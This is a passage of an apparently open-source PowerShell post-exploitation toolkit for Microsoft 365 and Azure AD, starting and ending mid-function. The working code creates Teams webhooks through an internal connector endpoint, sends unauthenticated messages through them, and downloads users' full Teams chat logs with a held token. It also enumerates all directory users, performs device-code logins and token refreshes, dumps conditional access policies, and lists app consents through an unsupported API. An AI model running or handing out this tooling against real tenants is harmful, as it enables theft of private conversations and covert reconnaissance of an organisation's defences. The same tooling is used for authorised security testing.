                            "Content-Disposition: form-data; name=`"AlternateId`"$LF",
                            "$AltIDvalue",
                            "--$boundary",
                            "Content-Disposition: form-data; name=`"ForwardToEmail`"$LF",
                            "$ForwardToEmailValue$LF",
                            "$LF",
                            "--$boundary",
                            "Content-Disposition: form-data; name=`"GroupName`"$LF",
                            "$GroupName",
                            "--$boundary",
                            "Content-Disposition: form-data; name=`"IsOwnerOfConfiguration`"$LF",
                            "True",
                            "--$boundary",
                            "Content-Disposition: form-data; name=`"IsNewProfile`"$LF",
                            "True",
                            "--$boundary",
                            "Content-Disposition: form-data; name=`"ProviderName`"$LF",
                            "$ProviderName",
                            "--$boundary",
                            "Content-Disposition: form-data; name=`"IsConnectedAccountsSupported`"$LF",
                            "False",
                            "--$boundary",
                            "Content-Disposition: form-data; name=`"GroupName`"$LF",
                            "$GroupName",
                            "--$boundary",
                            "Content-Disposition: form-data; name=`"AlternateId`"$LF",
                            "$AltIDvalue",
                            "--$boundary",
                            "Content-Disposition: form-data; name=`"IsIncomingWebhookType`"$LF",
                            "True",
                            "--$boundary",
                            "Content-Disposition: form-data; name=`"IsCreateFlow`"$LF",
                            "False",
                            "--$boundary",
                            "Content-Disposition: form-data; name=`"FriendlyName`"$LF",
                            "$webhookname",
                            "--$boundary",
                            "Content-Disposition: form-data; name=`"customImage`"; filename=`"`"",
                            "Content-Type: application/octet-stream$LF$LF",
                            "--$boundary--$LF" 
                        ) -join $LF
        

                        $webhookcreation = Invoke-WebRequest -Uri "https://outlook.office.com/connectors/$connectorurl/Manage/Create?Client=SkypeSpaces&MailboxAddress=$teamId%40$tenantid&Culture=en-us&HostName=teams.microsoft.com&iFrame=true&SSApiHost=amer.ng.msg.teams.microsoft.com&SSThread=$channelId&SSTheme=default&enableConnectorApps=true&isDesktopClient=false" -Method POST -headers $Creationheaders -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines -WebSession $WebSession
                        if ($ConnectorType -eq "IncomingWebhook"){
                            $pattern = '<button[^>]+onclick="CopyToClipboard\(''webhookUrl'', ''(https://[^'']+)'','
                        } else {
                            $pattern = '<button[^>]+onclick="CopyToClipboard\(''webhookUrl1'', ''(https://[^'']+)'','
                        }
                        $matches = [regex]::Matches($webhookcreation.Content, $pattern)

                        ### Check if there's at least one match and print the first token value
                        if ($matches.Count -gt 0) {
                            $Webhook_Address = $matches[0].Groups[1].Value
                            Write-Host "Webhook Creation Successful"
                            Write-Host "Webhook Name: $webhookname"
                            Write-Host "Webhook Address: $Webhook_Address"
                        }
                        else {
                            Write-Host "Error Webhook Address Not Found."
                        }
             break
        }     
    }
}

function Send-TeamsMessage{
    <#
    .SYNOPSIS
        This module sends a message using Microsoft Team's webhooks, without needing any authentication. 
        Author: Matt Eidelberg (@Tyl0us)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
        This module sends a message using Microsoft Team's webhooks, without needing any authentication. 


    .PARAMETER webhookUrl

        The full webhook url to use to send a message to. e.g. https://acmedomain.webhook.office.com/... Can also pass a $varible containing the url as well.

    .PARAMETER MessagecardFilePath

        The full path to the message template file you want to send.
  
    .EXAMPLE
        
        C:\PS> Send-TeamsMessage -webhookUrl $url -MessagecardFilePath .\message.txt
        -----------
        This module sends a message using Microsoft Team's webhooks, without needing any authentication.

    #>
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [string]
        $webhookUrl = "",
        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $MessagecardFilePath = ""
        )
       
        # Read the contents of the file into the $Messagecard variable
        $Messagecard = Get-Content -Path $MessagecardFilePath | Out-String

        $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $Messagecard -ContentType 'application/json'

        if ($($response) -eq "1") {
            Write-Host -ForegroundColor Yellow "Message sent"
        }
}


function Get-TeamsChat{
    <#
    .SYNOPSIS

        This module downloads full Teams chat conversations. It will prompt to either download all conversations for a particular user or if you want to download individual conversations using a chat ID. This modules requires that you have a token scoped to Chat.ReadBasic, Chat.Read, or Chat.ReadWrite.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       This module downloads full Teams chat conversations. It will prompt to either download all conversations for a particular user or if you want to download individual conversations using a chat ID. This modules requires that you have a token scoped to Chat.ReadBasic, Chat.Read, or Chat.ReadWrite.
        
    .PARAMETER Tokens

        Pass the $tokens global variable after authenticating to this parameter
  
    .EXAMPLE
        
        C:\PS> Get-TeamsChat -Tokens $tokens 
        -----------
        This will list out all of the Teams chat conversations for the user and provide an option to download all conversations or just individual chats.

    #>

    param(
    [Parameter(Position = 0, Mandatory = $false)]
    [object[]]
    $Tokens = ""
    )
    if($Tokens){
            Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."   
    }
    else{
        # Login
        Write-Host -ForegroundColor yellow "[*] This modules requires that you have a token scoped to Chat.ReadBasic, Chat.Read, or Chat.ReadWrite" 
        Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
        break
    }
    $access_token = $tokens.access_token   
    [string]$refresh_token = $tokens.refresh_token 


    # Define the headers with the access token and content type
    $headers = @{
    "Authorization" = "Bearer $access_token"
    "Content-Type" = "application/json"
    }


    $graphBaseUrl = "https://graph.microsoft.com/v1.0"
    $chatEndpoint = "/me/chats?`$expand=members,lastMessagePreview&orderby=lastMessagePreview/createdDateTime%20desc"
    $messagesEndpoint = "/chats/{chatId}/messages"

    # Get the list of chats for the authenticated user

    Write-Host -ForegroundColor Yellow "[*] Now getting Teams chat conversations for current user."
    $chatsResponse = Invoke-RestMethod -Uri "$graphBaseUrl$chatEndpoint" -Headers $headers -Method Get

    $totalchats = $chatsResponse."@odata.count"
    foreach($chatresult in $chatsResponse.value){
        # Format the DateTime object as a readable string
        Write-Output "Last Message Date: $($chatresult.lastMessagePreview.createdDateTime) | Members: $($chatresult.members.email -join ', ') | Message Preview: $($chatresult.lastMessagePreview.body.content) | ChatID: $($chatresult.id)"
        Write-Host ("=" * 80) 
    }

    # Process each chat and retrieve its messages
    if ($chatsResponse.value.Count -gt 0) {
        Write-Host -ForegroundColor Cyan "[*] A total of $totalchats conversations were found. Do you want to download all of them? (Yes/No)"
        $answer = Read-Host 
        $answer = $answer.ToLower()
        if ($answer -eq "yes" -or $answer -eq "y") {
            $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
            $folderName = "TeamsLogs-$timestamp"
            New-Item -ItemType Directory $folderName | Out-Null
            Write-Host -ForegroundColor yellow "[*] Now writing each conversation to $folderName"
            foreach ($chat in $chatsResponse.value) {
                $chatId = $chat.id
                $resultsList = @()
                $chatlastupdated = $chat.lastMessagePreview.createdDateTime -replace ":", "-"  # Replace colons with dashes

                # Get the names of chat members and prepare them for the filename
                $memberNames = ($chat.members.email | ForEach-Object { $_ -replace "\.", "_" }) -join "-"

                # Get messages for the current chat
                $messagesResponse = Invoke-RestMethod -Uri ($graphBaseUrl + $messagesEndpoint -replace '{chatId}', $chatId) -Headers $headers -Method Get

                # Process and save chat messages to a file
                if ($messagesResponse.value.Count -gt 0) {
                    $chatLogFileName = ("TeamsChatLog_" + $chatlastupdated + "_" + $memberNames + ".txt")

                    # Sort messages by createdDateTime
                    $sortedMessages = $messagesResponse.value | Sort-Object -Property createdDateTime

                    # Create or append to the chat log file
                    Foreach ($message in $sortedMessages) {
                        $LogInfo = @{
                            "Date" = $message.createdDateTime
                            "Sender" = $message.from.user.displayName
                            "Message" = $message.body.content
                        }
                        $resultsList += New-Object PSObject -Property $LogInfo
                    }
                    $resultsList | Export-Csv -Path "$foldername\$chatLogFileName" -NoTypeInformation -Append
                    Write-Host -ForegroundColor yellow "[*] Downloading coversation: $chatLogFileName."
                }
            }
        } elseif ($answer -eq "no" -or $answer -eq "n") {
            $downloadMore = $true
            while ($downloadMore) {
                # Ask the user if they want to download individual conversations
                Write-Host -ForegroundColor Cyan "[*] Do you want to download individual chat conversations? (Yes/No)"
                $individualAnswer = Read-Host
                $individualAnswer = $individualAnswer.ToLower()

                if ($individualAnswer -eq "yes" -or $individualAnswer -eq "y") {
                    # Prompt the user to enter the ChatID
                    $chatIdToDownload = Read-Host "Enter the ChatID of the conversation you want to download:"
                
                    # Find the chat with the specified ChatID
                    $selectedChat = $chatsResponse.value | Where-Object { $_.id -eq $chatIdToDownload }

                    if ($selectedChat) {
                        $chatlastupdated = $selectedChat.lastMessagePreview.createdDateTime -replace ":", "-"  # Replace colons with dashes

                        # Get the names of chat members and prepare them for the filename
                        $memberNames = ($selectedChat.members.email | ForEach-Object { $_ -replace "\.", "_" }) -join "-"

                        # Get messages for the selected chat
                        $messagesResponse = Invoke-RestMethod -Uri ($graphBaseUrl + $messagesEndpoint -replace '{chatId}', $chatIdToDownload) -Headers $headers -Method Get

                        # Process and save chat messages to a file
                        if ($messagesResponse.value.Count -gt 0) {
                            $chatLogFileName = ("TeamsChatLog_" + $chatlastupdated + "_" + $memberNames + ".txt")

                            # Sort messages by createdDateTime
                            $sortedMessages = $messagesResponse.value | Sort-Object -Property createdDateTime

                            # Create or append to the chat log file
                            $resultsList = @()
                            Foreach ($message in $sortedMessages) {
                                $LogInfo = @{
                                    "Date" = $message.createdDateTime
                                    "Sender" = $message.from.user.displayName
                                    "Message" = $message.body.content
                                }
                                $resultsList += New-Object PSObject -Property $LogInfo
                            }
                            $resultsList | Export-Csv -Path $chatLogFileName -NoTypeInformation -Append
                            Write-Host -ForegroundColor yellow "[*] Downloading conversation: $chatLogFileName."
                        } else {
                            Write-Output "[*] No messages found in the selected conversation."
                        }
                    } else {
                        Write-Output "[*] Chat with ChatID $chatIdToDownload not found."
                    }
                } else {
                    Write-Output "[*] Quitting..."
                    $downloadMore = $false  # Exit the loop
                }
            }
        } else {
            Write-Output "Invalid input. Please enter Yes or No."
        }
    } else {
        Write-Host "No chats found for the authenticated user."
    }
}

Function Get-AzureADUsers{
    <#
    .SYNOPSIS

        Gather the full list of users from the directory.        
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       Gather the full list of users from the directory.

    .PARAMETER Tokens

        Pass the $tokens global variable after authenticating to this parameter

    .PARAMETER OutFile

        File to output the results to
    
    .EXAMPLE
        
        C:\PS> Get-AzureADUsers -Tokens $tokens -OutFile users.txt
        -----------
        This will dump all Azure AD users to a text file called users.txt 

    #>
    param(
    [Parameter(Position = 0, Mandatory = $true)]
    [object[]]
    $Tokens = "",
    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $outfile = "",
    [switch]
    $GraphRun
    )
    $access_token = $tokens.access_token
    if(!$GraphRun){
    Write-Host "[*] Gathering the users from the tenant."
    }
    $usersEndpoint = "https://graph.microsoft.com/v1.0/users"
    $userlist = @()
    do{
        try{
		$request = Invoke-WebRequest -UseBasicParsing -Method GET -Uri $usersEndpoint -Headers @{"Authorization" = "Bearer $access_token"}
        }catch {
		if($_.Exception.Response.StatusCode.value__ -match "429"){
                Write-Host -ForegroundColor red "[*] Being throttled... sleeping 5 seconds"
                Start-Sleep -Seconds 5 
                }
	}
	$out = $request.Content | ConvertFrom-Json
        $userlist += $out.value.userPrincipalName 
        if ($out.'@odata.nextLink') {
            if(!$GraphRun){
            Write-Host "[*] Gathering more users..."
            }
            $usersEndpoint = $out.'@odata.nextLink'
        }
        else {
            # No more pages, exit loop
            break
        }
    } while ($true)
    if(!$GraphRun){
    Write-Output "---All Azure AD User Principal Names---"
    $userlist
    Write-Host -ForegroundColor green ("Discovered " + $userlist.count + " users")
    }
    $userlist | Out-File -Encoding ASCII $outfile
}



Function Invoke-DumpCAPS{
<#
    .SYNOPSIS
        Tool for dumping conditional access policies
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       Tool for dumping conditional access policies       
    
    .PARAMETER Tokens
        
        Token object for auth
    
    .PARAMETER ResolveGuids
        
        Switch to resolve user and group guids if wanted

    .EXAMPLE
        
        C:\PS> Invoke-DumpCAPS -ResolveGuids
        Description
        -----------
        This command will dump conditional access policies from the tenant and resolve user and group guids.


    .EXAMPLE

        C:\PS> Invoke-DumpCAPS -Tokens $tokens -ResolveGuids
        Description
        -----------
        Use a previously authenticated refresh token to dump CAPS
    
#>


    Param(


    [Parameter(Position = 0, Mandatory = $False)]
    [switch]
    $ResolveGuids,

    [Parameter(Position = 1, Mandatory = $False)]
    [object[]]
    $Tokens = "",
    [switch]
    $GraphRun

    )

    if($Tokens){
        if(!$GraphRun){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
        Write-Host -ForegroundColor Yellow "[*] Refreshing token to the Azure AD Graph API..."
        }
        $RefreshToken = $tokens.refresh_token
        $authUrl = "https://login.microsoftonline.com/$tenantid"
        $refreshbody = @{
                "resource" = "https://graph.windows.net/"
                "client_id" =     "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
                "grant_type" =    "refresh_token"
                "refresh_token" = $RefreshToken
                "scope"=         "openid"
            }

    try{
    $reftokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$($authUrl)/oauth2/token" -Headers $Headers -Body $refreshbody
    }
    catch{
    $details=$_.ErrorDetails.Message | ConvertFrom-Json
    Write-Output $details.error
    }
    if($reftokens)
        {
            $aadtokens = $reftokens
            $access_token = $aadtokens.access_token
        }
    }
    else{
        # Login
        Write-Host -ForegroundColor yellow "[*] Initiating a device code login."

        $body = @{
            "client_id" =     "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
            "resource" =      "https://graph.windows.net/"
        }
        $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
        $Headers=@{}
        $Headers["User-Agent"] = $UserAgent
        $authResponse = Invoke-RestMethod `
            -UseBasicParsing `
            -Method Post `
            -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
            -Headers $Headers `
            -Body $body
        Write-Host -ForegroundColor yellow $authResponse.Message

        $continue = "authorization_pending"
        while($continue)
            {
    
        $body=@{
            "client_id" =  "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
            "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
            "code" =       $authResponse.device_code
        }
        try{
        $aadtokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
        }
        catch{
        $details=$_.ErrorDetails.Message | ConvertFrom-Json
        $continue = $details.error -eq "authorization_pending"
        Write-Output $details.error
        }
        if($aadtokens)
            {
                $access_token = $aadtokens.access_token
                break
            }
        Start-Sleep -Seconds 3
        }   
    }

    $tokenPayload = $aadtokens.access_token.Split(".")[1].Replace('-', '+').Replace('_', '/')
    while ($tokenPayload.Length % 4) { Write-Verbose "Invalid length for a Base-64 char array or string, adding ="; $tokenPayload += "=" }
    $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
    $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
    $tokobj = $tokenArray | ConvertFrom-Json
    $tenantid = $tokobj.tid


    $HeadersAuth = @{
        Authorization = "Bearer $access_token"
    }

    $CAPSUrl = "https://graph.windows.net/$tenantid/policies?api-version=1.61-internal"
    $CAPS = Invoke-RestMethod -Method GET -Uri $CAPSUrl -Headers $HeadersAuth
    $parsedjson = $CAPS 
    if(!$GraphRun){
        Write-Host -ForegroundColor Yellow "[*] Now dumping conditional access policies from the tenant."
    }
    # Iterate through each policy object and print the details
    foreach ($policy in $parsedJson.value) {
        $policyType = $policy.policyType
        $displayName = $policy.displayName
        $policyDetail = $policy.policyDetail | ConvertFrom-Json
        if ($policyType -eq "18"){
            # Process the PolicyDetail field
            $policyState = $policyDetail.State
            $conditionspreformat = $policyDetail.Conditions 
            $controls = $policyDetail.Controls.Control -join ", "

            # Print the policy details
            # If the policy is disabled print in gray
            if ($policyState -eq "Disabled") {
                Write-Output "Display Name: $displayName"
                Write-Output  "Policy Type: $policyType"
                Write-Output "Policy State: $policyState"
                Write-Output  "Conditions:`n"
                $formattedConditions = @()

                foreach ($condition in $conditionspreformat.PSObject.Properties) {
                    $conditionType = $condition.Name
                    $conditionData = $condition.Value

                    $conditionText = ""

                    foreach ($includeExclude in @("Include", "Exclude")) {
                        if ($conditionData.$includeExclude) {
                            $conditionValues = @()

                            foreach ($includeData in $conditionData.$includeExclude) {
                                $includeType = $includeData.PSObject.Properties.Name
                                $includeValues = $includeData.PSObject.Properties.Value -split ', '  
                                $resolvedUsers = @()
                                if($ResolveGuids){
                                    foreach ($guid in $includeValues) {
                                        if ($guid -match '^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$') {
                                            $resolvedUser = ResolveGUID $guid $HeadersAuth
                                            $resolvedUsers += $resolvedUser
                                        } else {
                                            $resolvedUsers += $guid
                                        }
                                    }
                                }
                                else{
                                    foreach ($guid in $includeValues) {
                                        $resolvedUsers += $guid
                                    }
                                }
                                $includeValue = "$($resolvedUsers -join ', ')"
                                $conditionValues += "`t`t`t$includeType : $includeValue"
                            }

                            if ($conditionValues.Count -gt 0) {
                                $conditionText += "`t`t$includeExclude :`n$($conditionValues -join "`n")`n"
                            }
                        }
                    }

                    $formattedCondition = "`t$conditionType :`n$conditionText"
                    Write-Output $formattedCondition
                }
                Write-Output "Controls: $controls"
            } else {
                Write-Output "Display Name: $displayName"
                Write-Output "Policy Type: $policyType"
                Write-Output "Policy State: $policyState"
                Write-Output "Conditions:`n"
                $formattedConditions = @()

                foreach ($condition in $conditionspreformat.PSObject.Properties) {
                    $conditionType = $condition.Name
                    $conditionData = $condition.Value

                    $conditionText = ""

                    foreach ($includeExclude in @("Include", "Exclude")) {
                        if ($conditionData.$includeExclude) {
                            $conditionValues = @()

                            foreach ($includeData in $conditionData.$includeExclude) {
                                $includeType = $includeData.PSObject.Properties.Name
                                $includeValues = $includeData.PSObject.Properties.Value -split ', '  
                                $resolvedUsers = @()
                                if($ResolveGuids){
                                    foreach ($guid in $includeValues) {
                                        if ($guid -match '^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$') {
                                            $resolvedUser = ResolveGUID $guid $HeadersAuth
                                            $resolvedUsers += $resolvedUser
                                        } else {
                                            $resolvedUsers += $guid
                                        }
                                    }
                                }
                                else{
                                    foreach ($guid in $includeValues) {
                                        $resolvedUsers += $guid
                                    }
                                }
                                $includeValue = "$($resolvedUsers -join ', ')"
                                $conditionValues += "`t`t`t$includeType : $includeValue"
                            }

                            if ($conditionValues.Count -gt 0) {
                                $conditionText += "`t`t$includeExclude :`n$($conditionValues -join "`n")`n"
                            }
                        }
                    }

                    $formattedCondition = "`t$conditionType :`n$conditionText"
                    $formattedCondition
                }
    
                Write-Output "Controls: $controls"
            }
            # Separator
            Write-Output ("=" * 80) 
        }
    }
}



function ResolveGUID($guid,$HeadersAuth) {
    $url = "https://graph.windows.net/$tenantid/directoryObjects/$guid/?api-version=1.61-internal"
    try{
    $resolvedObject = Invoke-RestMethod -Method Get -Uri $url -Headers $HeadersAuth -ErrorAction Stop
    } catch {
    return "Unresolved: $guid"
    continue
    }
    if ($resolvedObject.objectType -eq "User") {
        return "$($resolvedObject.userPrincipalName)"
    } elseif ($resolvedObject.objectType -eq "Group") {
        return "$($resolvedObject.displayName)"
    } else {
        return "Unresolved: $guid"
    }
}



Function Invoke-DumpApps{
    <#
        .SYNOPSIS
            Dump all of the app registrations and external enterprise apps as well as list members that have consented to permissions on their accounts.
            Author: Beau Bullock (@dafthack)
            License: MIT
            Required Dependencies: None
            Optional Dependencies: None

        .DESCRIPTION
        
           Dump all of the app registrations and external enterprise apps as well as list members that have consented to permissions on their accounts.

        .EXAMPLES      
        
            C:\PS> Invoke-DumpApps -Tokens $tokens
    #>

    Param(

        [Parameter(Position = 0, Mandatory = $False)]
        [object[]]
        $Tokens = "",
        [switch]
        $GraphRun
    )

    if($Tokens){
        if(!$GraphRun){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
        }
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $accesstoken = $tokens.access_token   
    [string]$refreshToken = $tokens.refresh_token   
    if(!$GraphRun){
        Write-Host -ForegroundColor yellow "[*] Getting Microsoft Graph Object ID"
    }
    # Get full service principal list

    $initialUrl = "https://graph.microsoft.com/v1.0/servicePrincipals"
    $headers = @{"Authorization" = "Bearer $accesstoken"}

    # Initialize an array to store all collected data
    $allData = @()

    # Loop until there's no more nextLink
    do {
        # Invoke the web request
        $response = Invoke-WebRequest -UseBasicParsing -Uri $initialUrl -Headers $headers

        # Convert the response content to JSON
        $jsonData = $response.Content | ConvertFrom-Json

        # Add the current page's data to the array
        $allData += $jsonData.value

        # Check if there's a nextLink
        if ($jsonData.'@odata.nextLink') {
            $initialUrl = $jsonData.'@odata.nextLink'
        } else {
       
            break
        }
    } while ($true)

    $appDisplayNameToSearch = "Microsoft Graph"
    $graphId = $allData | Where-Object { $_.appDisplayName -eq $appDisplayNameToSearch } | Select-Object -ExpandProperty appId
    $graphIdInternal = $allData | Where-Object { $_.appDisplayName -eq $appDisplayNameToSearch } | Select-Object -ExpandProperty Id
    Write-Output "Graph ID: $graphId"
    Write-Output "Internal Graph ID: $graphIdInternal"

    # Get Object IDs of individual permissions
    if(!$GraphRun){
    Write-Host -ForegroundColor yellow "[*] Now getting object IDs for scope objects..."
    }
    $spns = Invoke-WebRequest -UseBasicParsing -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$graphIdInternal" -Headers $headers
    $spnsjson = $spns.Content | ConvertFrom-Json

    # Construct the Graph API endpoint
    $graphApiUrl = "https://graph.microsoft.com/v1.0"
    if(!$GraphRun){
    Write-Host -ForegroundColor yellow "[*] App Registrations:"
    }
    # Query app registrations
    $appRegistrations = Invoke-RestMethod -Uri "$graphApiUrl/applications" -Headers @{ Authorization = "Bearer $accessToken" }

    # Separator
                Write-Output ("=" * 80) 

    # Loop through each app registration
    foreach ($app in $appRegistrations.value) {
        $appId = $app.appId
        $appName = $app.displayName
        $createtime = $app.createdDateTime
        $signinaudience = $app.signInAudience
    
        # Query users who have consented to the app's permissions
        $approleurl = ($graphApiUrl + "/servicePrincipals(appId='" + $appId + "')/appRoleAssignedTo")
        $consentedUsers = Invoke-RestMethod -Uri $approleurl -Headers @{ Authorization = "Bearer $accessToken" }
    
        # Display app information and consented users
        Write-Output "App Name: $appName (App ID: $appId)"
        Write-Output "Creation Date: $createtime"
        Write-Output "Sign-In Audience: $signinaudience"
        foreach ($user in $consentedUsers.value) {
            $userId = $user.principalId
            $userDisplayName = $user.principalDisplayName
            Write-Output "Consented User: $userDisplayName (User ID: $userId)"
        }
        # Loop through each resource access entry
        foreach ($resourceAccess in $app.requiredResourceAccess) {
            $resourceAppId = $resourceAccess.resourceAppId
            $appscopes = @()
            $delegatedscopes = @()

            # Loop through each resource access item
            foreach ($accessItem in $resourceAccess.resourceAccess) {
                $scopeGuid = $accessItem.id
            
                # Use the spn list to find names of permissions
                foreach($approle in $spnsjson.appRoles){
                    if ($scopeGuid -like $approle.id) {
                        $scopeName = $approle.value
                        $appscopes += $scopeName
                    }
                }
                foreach($scoperole in $spnsjson.oauth2PermissionScopes){
                    if ($scopeGuid -like $scoperole.id) {
                        $dscopeName = $scoperole.value
                        $delegatedscopes += $dscopeName
                    }
                }
            }

            # Display the resource app ID and associated permission names (scopes)
            if ($appscopes.Count -gt 0) {
                Write-Output "App Permissions (Scopes): $($appscopes -join ', ')"
            }
            if ($delegatedscopes -gt 0) {
                Write-Output "Delegated Permissions (Scopes): $($delegatedscopes -join ', ')"
            }
        }
        Write-Output ""
        # Separator
                Write-Output ("=" * 80) 
    } 
            if(!$GraphRun){
            Write-Host -ForegroundColor yellow "[*] Now looking for external apps. Any apps displayed below are not owned by the current tenant or Microsoft's main app tenant."
            }
            Write-Output ("=" * 80) 

            $orginfo = Invoke-RestMethod -Uri "$graphApiUrl/organization" -Headers $headers
            $tenantid = $orginfo.value.id

            $authUrl = "https://login.microsoftonline.com/$tenantid"
            $unsupurl = "https://main.iam.ad.ext.azure.com"

            $unsupbody = @{
                    "resource" = "74658136-14ec-4630-ad9b-26e160ff0fc6"
                    "client_id" =     "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
                    "grant_type" =    "refresh_token"
                    "refresh_token" = $refreshToken
                    "scope"=         "openid"
                }

            $unsuptokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$($authUrl)/oauth2/token" -Headers $Headers -Body $unsupbody
            $unsupaccesstoken = $unsuptokens.access_token

        foreach ($serviceprincipal in $allData){
            $EntAppsScope = ""
            # Filter out Microsoft Tenant service principals like Kaizala, Teams, etc... MS Tenant = f8cdef31-a31e-4b4a-93e4-5f571e91255a
            if ($serviceprincipal.AppOwnerOrganizationId -ne "f8cdef31-a31e-4b4a-93e4-5f571e91255a" -and $serviceprincipal.AppOwnerOrganizationId -ne $tenantid)
            {
               $body = @{
                "client_id" =     "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
                "resource" =      "74658136-14ec-4630-ad9b-26e160ff0fc6"
            }
                $unsupheaders = @{
                    "Authorization"          = "Bearer " + $unsupaccesstoken
                    "Content-type"           = "application/json"
                    "X-Requested-With"       = "XMLHttpRequest"
                    "x-ms-client-request-id" = [guid]::NewGuid()
                    "x-ms-correlation-id"    = [guid]::NewGuid()
                }

                $unsupfullurl = ($unsupurl + "/api/EnterpriseApplications/" + $serviceprincipal.Id + "/ServicePrincipalPermissions?consentType=User&userObjectId=")
                $EntAppsScope = Invoke-RestMethod -Method GET -Uri $unsupfullurl -Headers $unsupheaders

                $unsupAdminfullurl = ($unsupurl + "/api/EnterpriseApplications/" + $serviceprincipal.Id + "/ServicePrincipalPermissions?consentType=Admin&userObjectId=")
                $EntAppsAdminScope = Invoke-RestMethod -Method GET -Uri $unsupAdminfullurl -Headers $unsupheaders
            
            

                Write-Output ("External App: " + $serviceprincipal.displayName)
                Write-Output ("AppId: " + $serviceprincipal.AppId)
                Write-Output ("Object ID: " + $serviceprincipal.Id)
                Write-Output ("appOwnerOrganizationId: " + $serviceprincipal.appOwnerOrganizationId)
                Write-Output ("Creation Date: " + $serviceprincipal.createdDateTime)
                Write-Output "Scope of Consent:"
                Foreach ($Entscopeitem in $EntAppsScope){
                $principals = @()
                foreach($userorgroup in $Entscopeitem.principalIds){
                    $userobject = Invoke-RestMethod -uri "$($graphApiUrl)/users/$userorgroup" -Headers $headers
                    $principals += $userobject.userPrincipalName
                }
                Write-Output ($Entscopeitem.permissionId + ", " + $Entscopeitem.permissionType + ", " + $($principals -join '; '))
                }
                Foreach ($Entscopeadminitem in $EntAppsAdminScope){
                $principals = @()
                foreach($userorgroup in $Entscopeadminitem.principalIds){
                    $userobject = Invoke-RestMethod -uri "$($graphApiUrl)/users/$userorgroup" -Headers $headers
                    $principals += $userobject.userPrincipalName
                }
                Write-Output ($Entscopeadminitem.permissionId + ", " + $Entscopeadminitem.permissionType + ", " + $($principals -join '; '))
                }
                Write-Output ""
                Write-Output ("=" * 80) 
            }
        
        }
}



function Get-SecurityGroups{
    <#
    .SYNOPSIS

        Gather the security groups and members from the directory.        
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       Gather the security groups and members from the directory.

    .PARAMETER AccessToken

        Pass the $tokens.access_token global variable after authenticating to this parameter

    .PARAMETER OutputFile

        The path to the CSV file where the security groups will be exported.

    .EXAMPLE
        
        C:\PS> Get-SecurityGroups -Tokens $tokens -OutputFile "security_groups.csv"
        -----------
        This will dump all security groups to the specified CSV file.
        -----------
        C:\PS> Get-SecurityGroups -Tokens $tokens -Client Custom -ClientID "cb1056e2-e479-49de-ae31-7812af012ed8" -Resource "https://graph.microsoft.com/ -Device AndroidMobile -Browser Android
    #>
    param (
        [Parameter(Mandatory = $False)]
        [object] $Tokens,
        [Parameter(Mandatory = $False)]
        [string] $OutputFile = "security_groups.csv", # Default value is "security_groups.csv"
        [Parameter(Mandatory = $False)]
        [switch] $GraphRun,
        [Parameter(Mandatory = $False)]
        [string] $RefreshToken,
        [Parameter(Mandatory = $False)]
        [string] $tenantid = $global:tenantid,
        [Parameter(Mandatory = $False)]
        [ValidateSet("Yammer", "Outlook", "MSTeams", "Graph", "AzureCoreManagement", "AzureManagement", "MSGraph", "DODMSGraph", "Custom", "Substrate")]
        [String[]] $Client = "MSGraph",
        [Parameter(Mandatory = $False)]
        [String] $ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",    
        [Parameter(Mandatory = $False)]
        [String] $Resource = "https://graph.microsoft.com",
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'AndroidMobile', 'iPhone')]
